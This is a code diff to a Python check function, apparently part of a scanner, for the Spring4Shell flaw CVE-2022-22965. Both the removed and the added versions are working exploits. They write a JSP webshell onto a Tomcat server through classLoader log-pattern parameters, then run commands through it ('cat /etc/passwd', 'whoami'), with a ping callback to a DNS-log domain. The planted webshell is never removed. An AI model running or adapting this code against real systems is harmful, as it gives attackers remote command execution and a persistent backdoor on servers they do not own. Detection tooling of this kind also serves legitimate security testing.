@@ -39,70 +39,70 @@ LOG_FILE_DATE_FORMAT = "class.module.classLoader.resources.context.parent.pipeli
 ARG_PAYLOAD = "?" + "&".join([LOG_PATTERN, LOG_FILE_SUFFIX, LOG_FILE_DIR, LOG_FILE_PREFIX, LOG_FILE_DATE_FORMAT])
 
 
-def check(url, dns_domain="", proxies=None, session=None):
+def check(url, dns_domain="", proxies=None, session=None, timeout=TIMEOUT):
     """
-    检测 CVE-2022-22965 漏洞（Spring4Shell 远程命令执行）
-    :param url: 待检测的目标 URL
-    :param dns_domain: DNS 日志域名（不使用，仅保持接口一致性）
-    :param proxies: 代理配置（可选）
+    检测 Spring4Shell (CVE-2022-22965) 远程代码执行漏洞
+    :param url: 目标 URL
+    :param dns_domain: DNS 日志域名
+    :param proxies: 代理配置
     :param session: 复用的 Session 实例（可选）
+    :param timeout: 请求超时时间（秒）
     :return: 如果存在漏洞，返回 (True, 详细信息字典)，否则返回 (False, {})
     """
-    # 使用传入的 session，如果没有则创建新的 session（用于单独测试时）
+    # 使用传入的 session，如果没有则创建新的 session
     session = session or requests.Session()
-
+    
     try:
-        # 1. 构建完整的 URL 并发送恶意请求以写入 JSP webshell
-        url_with_payload = url + ARG_PAYLOAD
-        session.get(url_with_payload, headers=HEADERS, verify=False, timeout=TIMEOUT, proxies=proxies)
-
-        # 2. 等待 5 秒以确保 JSP 文件上传完成
-        time.sleep(5)
-
-        # 3. 构建 webshell 访问路径，并执行命令
-        shell_url = urljoin(url, 'tomcatwar.jsp?pwd=j&cmd=cat /etc/passwd')
-        response = session.get(shell_url, headers=HEADERS, verify=False, timeout=TIMEOUT, proxies=proxies)
-        logger.debug(Fore.CYAN + f"[{response.status_code}]" + Fore.BLUE + f"[{response.headers}]",
-                     extra={"target": shell_url})
-
-        # 4. 检查返回内容中是否包含 "root:" 关键字，表示命令执行成功
-        if response.status_code == 200 and "root:" in response.text:
-            details = f"{CVE_ID} vulnerability detected at {shell_url}"
-            logger.info(Fore.RED + f"[{CVE_ID} vulnerability detected!]", extra={"target": shell_url})
-            return True, {
-                "CVE_ID": CVE_ID,
-                "URL": shell_url,
-                "Details": details
-            }
-
-        # 5. 如果未在初始 URL 中检测到 webshell，尝试使用根 URL 访问 webshell
-        parsed_url = urlparse(shell_url)
-        root_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
-        shell_url_root = urljoin(root_url, 'tomcatwar.jsp?pwd=j&cmd=cat /etc/passwd')
-        response_root = session.get(shell_url_root, headers=HEADERS, verify=False, timeout=TIMEOUT, proxies=proxies)
-        logger.debug(Fore.CYAN + f"[{response_root.status_code}]" + Fore.BLUE + f"[{response_root.headers}]",
-                     extra={"target": shell_url_root})
-
-        # 再次检查返回内容中是否包含 "root:" 关键字
-        if response_root.status_code == 200 and "root:" in response_root.text:
-            details = f"{CVE_ID} vulnerability detected at {shell_url_root}"
-            logger.info(Fore.RED + f"[{CVE_ID} vulnerability detected!]", extra={"target": shell_url_root})
-            return True, {
-                "CVE_ID": CVE_ID,
-                "URL": shell_url_root,
-                "Details": details
-            }
-
-        # 如果未检测到漏洞，返回 False
+        # 发送 GET 请求检测是否为 tomcat
+        target_url = url
+        res = session.get(target_url, headers=HEADERS, timeout=timeout, verify=False, proxies=proxies)
+        
+        # 检查是否为 tomcat 服务器
+        server_header = res.headers.get('Server', '').lower()
+        if 'tomcat' not in server_header and 'apache' not in server_header:
+            logger.info(f"[{CVE_ID} vulnerability not detected - not running on tomcat/apache]", extra={"target": target_url})
+            return False, {}
+            
+        # 构建探测 payload
+        jndi_payload = f"tomcatwar.jsp?pwd=j&cmd=ping+-c+1+{CVE_ID}.{dns_domain}"
+        
+        # 构建请求头
+        headers = {
+            "suffix": "%>//",
+            "c1": "Runtime",
+            "c2": "<%",
+            "DNT": "1",
+            "Content-Type": "application/x-www-form-urlencoded"
+        }
+        
+        # 发送 POST 请求尝试触发漏洞
+        data = f"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22{jndi_payload}%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.pattern"
+        res = session.post(target_url, headers=headers, data=data, timeout=timeout, verify=False, proxies=proxies)
+        
+        # 检查是否成功上传 webshell
+        if res.status_code >= 200 and res.status_code < 300:
+            # 尝试访问上传的 webshell
+            webshell_url = urljoin(url, "tomcatwar.jsp")
+            res = session.get(f"{webshell_url}?pwd=j&cmd=whoami", headers=HEADERS, timeout=timeout, verify=False, proxies=proxies)
+            
+            if res.status_code == 200 and (res.text.strip() != "" or "tomcatwar.jsp" in res.text):
+                details = f"{CVE_ID} vulnerability detected at {target_url} - Webshell at {webshell_url}"
+                logger.info(Fore.RED + f"[{CVE_ID} vulnerability detected!]", extra={"target": target_url})
+                return True, {
+                    "CVE_ID": CVE_ID,
+                    "URL": target_url,
+                    "Details": details,
+                    "Webshell": webshell_url
+                }
+        
         logger.info(f"[{CVE_ID} vulnerability not detected]", extra={"target": url})
         return False, {}
-
+        
     except (requests.Timeout, requests.ConnectionError, requests.RequestException) as e:
         # 捕获所有请求异常，并记录到日志
         logger.error(f"[Request Error：{e}]", extra={"target": url})
         return False, {}
     except Exception as e:
-        # 捕获所有其他未知异常，并记录到日志
         logger.error(f"[Unknown Error：{e}]", extra={"target": url})
         return False, {}
     finally:
